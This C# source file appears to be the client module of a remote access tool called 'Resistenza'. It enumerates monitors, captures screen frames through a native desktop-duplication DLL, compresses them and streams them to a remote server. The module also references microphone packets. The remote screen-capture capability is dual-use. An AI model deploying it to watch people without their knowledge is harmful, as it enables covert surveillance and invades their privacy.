using NAudio.CoreAudioApi;
using NAudio.Wave;
using Resistenza.Client.Logic;
using Resistenza.Common.Networking;
using Resistenza.Common.Packets.Microphone;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

using SharpDX;
using SharpDX.Direct3D11;
using SharpDX.DXGI;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using NAudio.Utils;
using System.IO.Compression;


namespace Resistenza.Common.Packets.Remote_Desktop
{

    class DesktopDuplicator
    {
        // DLL nativo
        private const string DllName = "NativeDesktopDuplication.dll";

        [DllImport(DllName)]
        public static extern int InitializeDuplicator(int adapterIndex, int outputIndex);

        [DllImport(DllName)]
        public static extern int GetFrame(out IntPtr data, out int width, out int height, out int pitch);

        [DllImport(DllName)]
        public static extern void ReleaseFrame();

        [DllImport(DllName)]
        public static extern void Shutdown();

        // Cursor helper
        public static class CursorHelper
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct POINT { public int X; public int Y; }

            [StructLayout(LayoutKind.Sequential)]
            public struct ICONINFO
            {
                public bool fIcon;
                public int xHotspot;
                public int yHotspot;
                public IntPtr hbmMask;
                public IntPtr hbmColor;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct CURSORINFO
            {
                public int cbSize;
                public int flags;
                public IntPtr hCursor;
                public POINT ptScreenPos;
            }

            [DllImport("user32.dll")]
            public static extern bool GetCursorInfo(out CURSORINFO pci);

            [DllImport("user32.dll")]
            public static extern bool GetIconInfo(IntPtr hIcon, out ICONINFO piconinfo);

            [DllImport("gdi32.dll")]
            public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

            [DllImport("gdi32.dll")]
            public static extern bool DeleteDC(IntPtr hdc);

            public const int CURSOR_SHOWING = 0x00000001;

            [DllImport("gdi32.dll")]
            private static extern bool GetBitmapBits(IntPtr hBitmap, int cbBuffer, byte[] lpvBits);

            [StructLayout(LayoutKind.Sequential)]
            private struct BITMAP
            {
                public int bmType;
                public int bmWidth;
                public int bmHeight;
                public int bmWidthBytes;
                public ushort bmPlanes;
                public ushort bmBitsPixel;
                public IntPtr bmBits;
            }

            [DllImport("gdi32.dll")]
            private static extern int GetObject(IntPtr hObject, int nSize, out BITMAP lpObject);

    

            // Disegna il cursore direttamente sul buffer ARGB
            public static void DrawCursor(IntPtr buffer, int width, int height, int pitch)
            {

            }
        }
    }


    public class DesktopBroadcast
    {
        public DesktopBroadcast(SecureStream Server)
        {

            _ServerStream = Server;
        
        }

        private SecureStream _ServerStream;
  
        private int _Frames;

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern bool EnumDisplayDevices(string lpDevice, uint iDevNum, ref DISPLAY_DEVICE lpDisplayDevice, uint dwFlags);

        [Flags()]
        public enum DisplayDeviceStateFlags : int
        {
            /// <summary>The device is part of the desktop.</summary>
            AttachedToDesktop = 0x1,
            MultiDriver = 0x2,
            /// <summary>The device is part of the desktop.</summary>
            PrimaryDevice = 0x4,
            /// <summary>Represents a pseudo device used to mirror application drawing for remoting or other purposes.</summary>
            MirroringDriver = 0x8,
            /// <summary>The device is VGA compatible.</summary>
            VGACompatible = 0x10,
            /// <summary>The device is removable; it cannot be the primary display.</summary>
            Removable = 0x20,
            /// <summary>The device has more display modes than its output devices support.</summary>
            ModesPruned = 0x8000000,
            Remote = 0x4000000,
            Disconnect = 0x2000000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct DISPLAY_DEVICE
        {
            [MarshalAs(UnmanagedType.U4)]
            public int cb;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
            public string DeviceName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string DeviceString;
            [MarshalAs(UnmanagedType.U4)]
            public DisplayDeviceStateFlags StateFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string DeviceID;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string DeviceKey;
        }


        public static List<MonitorDeviceInfo> GetDevicesInfo()
        {
            List<MonitorDeviceInfo> Monitors = new();

            ManagementObjectSearcher searcher =
                new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_DesktopMonitor");


            foreach (Screen ScreenDevice in Screen.AllScreens)
            {
                MonitorDeviceInfo Info = new();
                Info.ScreenWidth = ScreenDevice.Bounds.Size.Width;
                Info.ScreenHeight = ScreenDevice.Bounds.Size.Height;
                Info.IsMainMonitor = ScreenDevice.Primary;

                //a quanto pare prima serve MonitorDeviceInfo.DeviceName per poi, utilizzando la funzione dell'api di windows EnumDisplayDevices(), trovare il friendly name

                DISPLAY_DEVICE d = new DISPLAY_DEVICE();
                d.cb = Marshal.SizeOf(d);
                EnumDisplayDevices(ScreenDevice.DeviceName, 0, ref d, 0);

                Info.Name = ScreenDevice.DeviceName;
                Info.FriendlyName = d.DeviceString;




                Monitors.Add(Info);
            }

            return Monitors;


        }


        public async Task StartStreaming(string DeviceName, CancellationTokenSourceWithId CancelOperation)
        {


            
            IntPtr data;
            int width, height, pitch;
            int buffer_size;

           

            // Inizializza il duplicatore sul primo monitor/output
            if (DesktopDuplicator.InitializeDuplicator(0, 0) != 0)
            {
                Console.WriteLine("[ERROR] InitializeDuplicator failed");
                return;
            }

            try
            {

                Task SendTask = Task.CompletedTask;

                while (true)
                {
                    // Controllo cancel
                    if (CancelOperation.IsCancellationRequested &&
                        (CancelOperation.IdOfTaskToBeCancelled == TasksIds.STREAM_DESKTOP_TASK_ID ||
                         CancelOperation.IdOfTaskToBeCancelled == TasksIds.ALL_ACTIONS))
                    {
                        DesktopDuplicator.Shutdown();
                        CancelOperation.Token.ThrowIfCancellationRequested();
                    }

                    

                    // Ottieni frame
                    if (DesktopDuplicator.GetFrame(out data, out width, out height, out pitch) == 0)
                    {
                        // Disegna cursore sul buffer
                        DesktopDuplicator.CursorHelper.DrawCursor(data, width, height, pitch);

                        // Copia il buffer in un array gestito
                        buffer_size = height * pitch;
                        byte[] rawBuffer = new byte[buffer_size];
                        Marshal.Copy(data, rawBuffer, 0, buffer_size);

                        DesktopDuplicator.ReleaseFrame();

                        // Comprimi con GZip
                        byte[] compressedBuffer;
                        using (MemoryStream ms = new MemoryStream())
                        {
                            using (GZipStream gzip = new GZipStream(ms, CompressionLevel.Fastest))
                            {
                                gzip.Write(rawBuffer, 0, rawBuffer.Length);
                            }
                            compressedBuffer = ms.ToArray();
                        }

                        var response = new DesktopFrameResponse
                        {
                            ScreenCapture = compressedBuffer,
                            Width = width,
                            Height = height,
                            Pitch = pitch
                         
                        };

                        await SendTask;
                        SendTask = _ServerStream.SendPacketAsync(response);
                        
                    }

                    
                }
            }
            catch (OperationCanceledException)
            {
                Console.WriteLine("[INFO] Streaming cancelled");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR] Exception during streaming: " + ex);
            }
            finally
            {
                DesktopDuplicator.Shutdown();
            }


        }

        unsafe
public static void SaveFrameAsJpeg(IntPtr buffer, int width, int height, int pitch, string filePath)
        {
            // Crea bitmap vuota con PixelFormat corretto
            using (Bitmap bmp = new Bitmap(width, height, PixelFormat.Format32bppArgb))
            {
                // Blocca i dati della bitmap
                BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0, width, height), ImageLockMode.WriteOnly, bmp.PixelFormat);
                byte* destPtr = (byte*)bmpData.Scan0;

                for (int y = 0; y < height; y++)
                {
                    byte* srcRow = (byte*)buffer + y * pitch;
                    byte* destRow = destPtr + y * bmpData.Stride;
                    for (int x = 0; x < width; x++)
                    {
                        destRow[0] = srcRow[0]; // B
                        destRow[1] = srcRow[1]; // G
                        destRow[2] = srcRow[2]; // R
                        destRow[3] = srcRow[3]; // A
                        srcRow += 4;
                        destRow += 4;
                    }
                }

                bmp.UnlockBits(bmpData);

                // Salva come JPEG
                bmp.Save(filePath, ImageFormat.Jpeg);
            }
        }





    }

    public class MonitorDeviceInfo
    {
        public string Name { get; set; }
        public string FriendlyName { get; set; }
        public int ScreenHeight { get; set; }
        public int ScreenWidth { get; set; }
        public bool IsMainMonitor { get; set; }

    }

}
